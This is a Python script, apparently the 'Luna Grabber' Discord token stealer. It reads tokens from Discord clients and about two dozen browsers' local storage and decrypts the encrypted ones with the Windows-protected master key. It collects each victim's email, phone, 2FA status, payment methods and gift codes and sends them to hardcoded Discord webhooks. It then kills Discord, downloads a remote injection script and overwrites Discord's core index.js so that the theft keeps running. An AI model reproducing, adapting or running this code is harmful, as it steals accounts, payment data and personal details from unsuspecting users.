import os
import re
import subprocess
import base64
import json

try: import psutil
except ModuleNotFoundError: os.system("pip install psutil")

try: import requests
except ModuleNotFoundError: os.system("pip install requests")

try: from Crypto.Cipher import AES
except ModuleNotFoundError: os.system("pip install pycryptodome")

try: from win32crypt import CryptUnprotectData
except ModuleNotFoundError: os.system("pip install pypiwin32")

os.system("cls")

class D:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tks_sent = []
        self.tks = []
        self.ids = []
        self.grabtks()
        self.upload('https://discord.com/api/webhooks/1086787651782328410/sDoP7NpMYWzvE_mZMmx03iuACCPv8HwLGNC8Yzv4ppTi5j42kbrMvSg_Au8jUsSa5G7n')
    def decrypt_val(self, buff, master_key):
        try: return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except Exception: return "Failed to decrypt password"
    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f: return CryptUnprotectData(base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
    def grabtks(self):
        paths = {'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\','Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\','Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\','Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
        for name, path in paths.items():
            if not os.path.exists(path): continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]: continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                tk = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': tk})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tks.append(tk)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for tk in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': tk})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tks.append(tk)
                                    self.ids.append(uid)
        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for tk in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': tk})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tks.append(tk)
                                    self.ids.append(uid)
    def upload(self, webhook):
        for tk in self.tks:
            if tk in self.tks_sent: pass
            val_codes = []
            val = ""
            nitro = ""
            user = requests.get(self.baseurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': tk}).json()
            pmt = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': tk}).json()
            gift = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': tk})
            username = user['username'] + '#' + user['discriminator']
            discord_id = user['id']
            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            phone = user['phone']
            email = user['email']
            if user['mfa_enabled']: mfa = "✅"
            else: mfa = "❌"
            premium_types = {0: "❌",1: "Nitro Classic",2: "Nitro",3: "Nitro Basic"}
            nitro = premium_types.get(user['premium_type'], "❌")
            methods = "❌"
            if pmt:
                methods = ""
                for method in pmt:
                    if method['type'] == 1: methods += "💳"
                    elif method['type'] == 2: methods += "<:paypal:973417655627288666>"
                    else: methods += "❓"
            val += f'<:1119pepesneakyevil:972703371221954630> **ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔒 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **tk:** `{tk}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={tk})\n'
            if "code" in gift.text:
                codes = json.loads(gift.text)
                for code in codes:
                    try: val_codes.append((code['code'], code['promotion']['outbound_title']))
                    except: pass
            if not val_codes: val += "\n:gift: **No Gift Cards Found**\n"
            elif len(val_codes) >= 3:
                num = 0
                for c, t in val_codes:
                    num += 1
                    if num == 3: break
                    val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
            else:
                for c, t in val_codes: val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
            requests.post(webhook, json={"embeds": [{"title": f"{username}","color": 5639644,"fields": [{"name": "\u200b","value": val}],"thumbnail": {"url": avatar},"footer": {"text": "Luna Grabber | Created By Smug"},}],"username": "Luna","avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",})
            self.tks_sent += tk
class I:
    def __init__(self, webhook = 'https://discord.com/api/webhooks/1085264670639792169/BvKtc3LXbHMxeB-anttTr5SzgS2S_-9jzN9KfSoXqb7d8V8e_7PablbntWgBsZhMo53j') -> None:
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [self.appdata + '\\Discord',self.appdata + '\\DiscordCanary',self.appdata + '\\DiscordPTB',self.appdata + '\\DiscordDevelopment']
        self.code = requests.get('https://raw.githubusercontent.com/Smug246/luna-injection/main/injection.js').text

        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower(): proc.kill()

        for dir in self.discord_dirs:
            if not os.path.exists(dir): continue

            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                    self.sd(dir)
    def get_core(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules): continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'): continue
                        return core, file
    def sd(self, dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable: subprocess.call([update, '--processStart', app + '\\' + executable],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


D()
I()
